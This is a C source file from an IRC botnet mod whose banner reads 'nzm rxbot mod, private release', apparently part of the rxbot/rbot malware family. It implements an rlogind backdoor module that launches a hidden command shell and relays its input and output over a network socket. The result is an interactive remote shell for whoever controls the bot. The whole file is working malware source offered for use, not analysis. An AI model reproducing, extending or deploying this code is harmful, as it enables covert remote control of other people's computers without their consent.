/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.04.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/


#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

#ifndef NO_RLOGIND

static PSESSION_DATA CreateSession(int threadnum)
{
	PSESSION_DATA Session = NULL;
	BOOL Result;
	SECURITY_ATTRIBUTES SecurityAttributes;
	HANDLE ShellStdinPipe = NULL, ShellStdoutPipe = NULL;

	if ((Session = (PSESSION_DATA)malloc(sizeof(SESSION_DATA))) == NULL)
		return (NULL);

	Session->ReadPipeHandle = NULL;
	Session->WritePipeHandle = NULL;

	SecurityAttributes.nLength = sizeof(SecurityAttributes);
	SecurityAttributes.lpSecurityDescriptor = NULL;
	SecurityAttributes.bInheritHandle = TRUE;

	if ((Result = CreatePipe(&Session->ReadPipeHandle,&ShellStdoutPipe,&SecurityAttributes,0)) == FALSE) {
		addlogv("nzm (rlogind.plg) »»  Failed to create shell stdout pipe, error: <%d>.", GetLastError());
		goto Failure;
	}
	if ((Result = CreatePipe(&ShellStdinPipe,&Session->WritePipeHandle,&SecurityAttributes,0)) == FALSE) {
		addlogv("nzm (rlogind.plg) »»  Failed to create shell stdin pipe, error: <%d>.", GetLastError());
		goto Failure;
	}

	Session->ProcessHandle = StartShell(ShellStdinPipe, ShellStdoutPipe, threadnum);

	CloseHandle(ShellStdinPipe);
	CloseHandle(ShellStdoutPipe);

	if (Session->ProcessHandle == NULL) {
		addlog("nzm (rlogind.plg) »»  Failed to execute shell.");
		goto Failure;
	}

	Session->ClientSocket = INVALID_SOCKET;

	return (Session);

	Failure:

	if (ShellStdinPipe != NULL)
		CloseHandle(ShellStdinPipe);
	if (ShellStdoutPipe != NULL)
		CloseHandle(ShellStdoutPipe);
	if (Session->ReadPipeHandle != NULL)
		CloseHandle(Session->ReadPipeHandle);
	if (Session->WritePipeHandle != NULL)
		CloseHandle(Session->WritePipeHandle);

	free(Session);

	return (NULL);
}

BOOL SessionRun(int threadnum)
{
	PSESSION_DATA Session = CreateSession(threadnum);
	SECURITY_ATTRIBUTES SecurityAttributes;
	DWORD ThreadId;
	HANDLE HandleArray[3];

	assert(threads[threadnum].sock != INVALID_SOCKET);

	SecurityAttributes.nLength = sizeof(SecurityAttributes);
	SecurityAttributes.lpSecurityDescriptor = NULL;
	SecurityAttributes.bInheritHandle = FALSE;

	Session->ClientSocket = threads[threadnum].sock;

	if ((Session->ReadShellThreadHandle = CreateThread(&SecurityAttributes,0,
		(LPTHREAD_START_ROUTINE)SessionReadShellThread,(LPVOID)Session,0,&ThreadId)) == NULL) {
		addlogv("nzm (rlogind.plg) »»  Failed to create ReadShell session thread, error: <%d>.", GetLastError());
		Session->ClientSocket = INVALID_SOCKET;

		return(FALSE);
	}

	if ((Session->WriteShellThreadHandle = CreateThread(&SecurityAttributes,0,
		(LPTHREAD_START_ROUTINE)SessionWriteShellThread,(LPVOID)Session,0,&ThreadId)) == NULL) {
		addlogv("nzm (rlogind.plg) »»  Failed to create ReadShell session thread, error: <%d>.", GetLastError());
		Session->ClientSocket = INVALID_SOCKET;

		TerminateThread(Session->WriteShellThreadHandle, 0);
		return(FALSE);
	}

	HandleArray[0] = Session->ReadShellThreadHandle;
    HandleArray[1] = Session->WriteShellThreadHandle;
    HandleArray[2] = Session->ProcessHandle;

	switch (WaitForMultipleObjects(3, HandleArray, FALSE, 0xffffffff)) {
	case WAIT_OBJECT_0 + 0:
		TerminateThread(Session->WriteShellThreadHandle, 0);
		TerminateProcess(Session->ProcessHandle, 1);
		break;

	case WAIT_OBJECT_0 + 1:
		TerminateThread(Session->ReadShellThreadHandle, 0);
		TerminateProcess(Session->ProcessHandle, 1);
		break;

	case WAIT_OBJECT_0 + 2:
		TerminateThread(Session->WriteShellThreadHandle, 0);
		TerminateThread(Session->ReadShellThreadHandle, 0);
		break;

	default:
		addlogv("nzm (rlogind.plg) »»  WaitForMultipleObjects error: <%d>.", GetLastError());
		break;
	}

	CloseHandle(Session->ReadShellThreadHandle);
	CloseHandle(Session->WriteShellThreadHandle);
	CloseHandle(Session->ProcessHandle);
	CloseHandle(Session->ReadPipeHandle);
	CloseHandle(Session->WritePipeHandle);

	fclosesocket(Session->ClientSocket);

	free(Session);

	return(TRUE);
}

static HANDLE StartShell(HANDLE ShellStdinPipeHandle, HANDLE ShellStdoutPipeHandle, int threadnum)
{
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	HANDLE ProcessHandle = NULL;

	memset(&sinfo, 0, sizeof(sinfo));
	memset(&pinfo, 0, sizeof(pinfo));

	sinfo.lpTitle = NULL;
	sinfo.cb = sizeof(STARTUPINFO);
	sinfo.lpReserved = NULL;
	sinfo.lpTitle = NULL;
	sinfo.lpDesktop = NULL;
	sinfo.dwX = sinfo.dwY = sinfo.dwXSize = sinfo.dwYSize = 0L;
	sinfo.wShowWindow = SW_HIDE;
	sinfo.lpReserved2 = NULL;
	sinfo.cbReserved2 = 0;
	sinfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	sinfo.hStdInput = ShellStdinPipeHandle;
	sinfo.hStdOutput = ShellStdoutPipeHandle;

	DuplicateHandle(GetCurrentProcess(),ShellStdoutPipeHandle,
		GetCurrentProcess(),&sinfo.hStdError,DUPLICATE_SAME_ACCESS,TRUE,0);

    if (CreateProcess(NULL,SHELL_COMMAND_LINE,NULL,NULL,TRUE,0,NULL,NULL,&sinfo,&pinfo)) {
		ProcessHandle = pinfo.hProcess;
		threads[threadnum].pid = pinfo.dwProcessId;
		CloseHandle(pinfo.hThread);
    } else
		addlogv("nzm (rlogind.plg) »»  Failed to execute shell, error: <%d>.", GetLastError());

	return(ProcessHandle);
}

static void SessionReadShellThread(LPVOID param)
{
	PSESSION_DATA Session = (PSESSION_DATA)param;
	char Buffer[BUFFER_SIZE], Buffer2[BUFFER_SIZE+30];
	DWORD BytesRead;

	while (ReadFile(Session->ReadPipeHandle, Buffer, sizeof(Buffer), &BytesRead, NULL)) {
		DWORD BufferCnt, BytesToWrite;
		BYTE PrevChar = 0;

		for (BufferCnt = 0, BytesToWrite = 0; BufferCnt < BytesRead; BufferCnt++) {
			if (Buffer[BufferCnt] == '\n' && PrevChar != '\r')
				Buffer2[BytesToWrite++] = '\r';
			PrevChar = Buffer2[BytesToWrite++] = Buffer[BufferCnt];
			assert(BytesToWrite < sizeof Buffer2);
		}

		if (fsend(Session->ClientSocket, Buffer2, BytesToWrite, 0) <= 0)
			break;
	}

	if (GetLastError() != ERROR_BROKEN_PIPE)
		addlogv("nzm (rlogind.plg) »»  SessionReadShellThread exited, error: <%ld>.", GetLastError());

	return;
}

static void SessionWriteShellThread(LPVOID param)
{
	PSESSION_DATA Session = (PSESSION_DATA)param;
	char RecvBuffer[1], Buffer[BUFFER_SIZE], EchoBuffer[5];
	DWORD BytesWritten, BufferCnt = 0, EchoCnt, TossCnt = 0;
	BOOL PrevWasFF = FALSE;

	while (frecv(Session->ClientSocket, RecvBuffer, sizeof(RecvBuffer), 0) > 0) {
		if (TossCnt > 0) {
			TossCnt -= 1;
			continue;
		}

		if (RecvBuffer[0] != 0xff)
			PrevWasFF = FALSE;
		else {
			if (! PrevWasFF)
				PrevWasFF = TRUE;
			else {
				TossCnt = 10;
				PrevWasFF = FALSE;
			}
			continue;
		}

		EchoCnt = 0;
		if (RecvBuffer[0] == CHAR_BS || RecvBuffer[0] == CHAR_DEL) {
			if (BufferCnt > 0) {
				BufferCnt -= 1;
				EchoBuffer[EchoCnt++] = CHAR_BS;
				EchoBuffer[EchoCnt++] = ' ';
				EchoBuffer[EchoCnt++] = CHAR_BS;
			}
		} else if (RecvBuffer[0] == CHAR_CTRL_C) {
			GenerateConsoleCtrlEvent(CTRL_C_EVENT, 0);
		} else if (RecvBuffer[0] == CHAR_CTRL_U) {
			BufferCnt = 0;
			EchoBuffer[EchoCnt++] = ' ';
			EchoBuffer[EchoCnt++] = 'X';
			EchoBuffer[EchoCnt++] = 'X';
			EchoBuffer[EchoCnt++] = 'X';
			EchoBuffer[EchoCnt++] = '\r';
			EchoBuffer[EchoCnt++] = '\n';
		} else {
			Buffer[BufferCnt++] = EchoBuffer[EchoCnt++] = RecvBuffer[0];
			if (RecvBuffer[0] == '\r')
				Buffer[BufferCnt++] = EchoBuffer[EchoCnt++] = '\n';
		}

		if (EchoCnt > 0 && fsend(Session->ClientSocket, EchoBuffer, EchoCnt, 0) <= 0)
			break;

		if (RecvBuffer[0] == '\r') {
			if (! WriteFile(Session->WritePipeHandle, Buffer, BufferCnt, &BytesWritten, NULL))
				break;
			BufferCnt = 0;
		}
	}

	return;
}
#endif
